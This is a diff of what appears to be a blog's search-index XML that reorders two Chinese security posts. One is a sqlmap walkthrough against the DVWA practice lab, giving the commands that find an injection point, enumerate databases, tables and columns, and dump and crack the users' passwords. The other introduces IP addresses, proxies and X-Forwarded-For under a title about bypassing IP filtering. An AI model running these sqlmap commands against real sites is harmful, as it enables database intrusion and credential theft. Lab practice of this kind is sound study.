@@ -1251,17 +1251,17 @@
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[IP地址及其绕过]]></title>
-    <url>%2F2018%2F07%2F19%2FIP%E5%9C%B0%E5%9D%80%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%2F</url>
-    <content type="text"><![CDATA[绕过服务器IP地址过滤 IP地址IP地址被用来给Internet上的电脑一个编号。是每台联网的PC上都需要有IP地址，才能正常通信。我们可以把“个人电脑”比作“一台电话”，那么“IP地址”就相当于“电话号码” 查看本机IP地址以管理员身份运行cmd，输入ipconfig回车 网络中的代理代理服务器是”网络信息的中转站”。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器 X-Forwarded-For当你使用了代理时，web服务器就不知道你的真实IP了，为了避免这个情况，代理服务器通常会增加一个叫做X-Forwarded-For的头信息，把连接它的客户端IP（即你的上网机器IP）加到这个头信息里，这样就能保证网站的web服务器能获取到真实IP]]></content>
+    <title><![CDATA[SQLmap注入]]></title>
+    <url>%2F2018%2F07%2F19%2FSQLmap%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[自己试了一下使用sqlmap注入获取密码，还挺有意思的 SQLMAP什么是SQLMAPSQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。 sqlmap只是用来检测和利用sql注入点的，并不能扫描出网站有哪些漏洞 通过DVWA测试注入获取信息流程1.将DVWA安全设置为low；复制SQL Injection页面的网址 检测注入点是否可用： sqlmap.py -u &quot;网址&quot;参数： -u：指定注入点url2.找不到注入点：回到SQL Injection页面随便输入然后submit，通过抓包获取详细的参数列表和cookie信息 将参数增添加在原网址后；在指令后面加入Cookie信息 sqlmap.py -u &quot;目标地址&quot; --cookie=&quot;信息&quot; 注入结果展示： （1）注入参数id为GET注入，注入类型有四种分别为：boolean-based blind、error-based、stacked queries、inline query。 （2）web服务器系统为windows （3）web应用程序技术为：... （4）数据库类型为：...3.使用 –dbs 即可曝出该sqlserver中所有数据库名称 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs 结果显示该sqlserver中共包含5个可用的数据库。 4.获取web当前使用的数据库 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db 5.枚举DVWA数据表，执行以下命令： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables使用选项： 1、-D: 要枚举的DBMS数据库 2、–tables: 枚举DBMS数据库中的数据表 #数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件， 用于建立、使用和维护数据库，简称DBMS 6.获取用户表的列 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users --columns使用选项： -T : 要枚举的DBMS数据库表 –columns : 枚举DBMS数据库表中的所有列 7.将用户与密码表中的所有用户名与密码dump出来： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users -C user,password --dump使用选项： -T : 要枚举的DBMS数据表 -C: 要枚举的DBMS数据表中的列 –dump : 转储DBMS数据表项SQLmap会提问是否破解密码,输入y确认]]></content>
       <categories>
         <category>web</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[SQLmap注入]]></title>
-    <url>%2F2018%2F07%2F19%2FSQLmap%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[自己试了一下使用sqlmap注入获取密码，还挺有意思的 SQLMAP什么是SQLMAPSQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。 sqlmap只是用来检测和利用sql注入点的，并不能扫描出网站有哪些漏洞 通过DVWA测试注入获取信息流程1.将DVWA安全设置为low；复制SQL Injection页面的网址 检测注入点是否可用： sqlmap.py -u &quot;网址&quot;参数： -u：指定注入点url2.找不到注入点：回到SQL Injection页面随便输入然后submit，通过抓包获取详细的参数列表和cookie信息 将参数增添加在原网址后；在指令后面加入Cookie信息 sqlmap.py -u &quot;目标地址&quot; --cookie=&quot;信息&quot; 注入结果展示： （1）注入参数id为GET注入，注入类型有四种分别为：boolean-based blind、error-based、stacked queries、inline query。 （2）web服务器系统为windows （3）web应用程序技术为：... （4）数据库类型为：...3.使用 –dbs 即可曝出该sqlserver中所有数据库名称 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs 结果显示该sqlserver中共包含5个可用的数据库。 4.获取web当前使用的数据库 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db 5.枚举DVWA数据表，执行以下命令： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables使用选项： 1、-D: 要枚举的DBMS数据库 2、–tables: 枚举DBMS数据库中的数据表 #数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件， 用于建立、使用和维护数据库，简称DBMS 6.获取用户表的列 sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users --columns使用选项： -T : 要枚举的DBMS数据库表 –columns : 枚举DBMS数据库表中的所有列 7.将用户与密码表中的所有用户名与密码dump出来： sqlmap.py -u &quot;网址&quot; --cookie=&quot;information&quot; --dbs --current-db -D dvwa --tables -T users -C user,password --dump使用选项： -T : 要枚举的DBMS数据表 -C: 要枚举的DBMS数据表中的列 –dump : 转储DBMS数据表项SQLmap会提问是否破解密码,输入y确认]]></content>
+    <title><![CDATA[IP地址及其绕过]]></title>
+    <url>%2F2018%2F07%2F19%2FIP%E5%9C%B0%E5%9D%80%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%2F</url>
+    <content type="text"><![CDATA[绕过服务器IP地址过滤 IP地址IP地址被用来给Internet上的电脑一个编号。是每台联网的PC上都需要有IP地址，才能正常通信。我们可以把“个人电脑”比作“一台电话”，那么“IP地址”就相当于“电话号码” 查看本机IP地址以管理员身份运行cmd，输入ipconfig回车 网络中的代理代理服务器是”网络信息的中转站”。在一般情况下，我们使用网络浏览器直接去连接其他Internet站点取得网络信息时，须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器 X-Forwarded-For当你使用了代理时，web服务器就不知道你的真实IP了，为了避免这个情况，代理服务器通常会增加一个叫做X-Forwarded-For的头信息，把连接它的客户端IP（即你的上网机器IP）加到这个头信息里，这样就能保证网站的web服务器能获取到真实IP]]></content>
       <categories>
         <category>web</category>
       </categories>
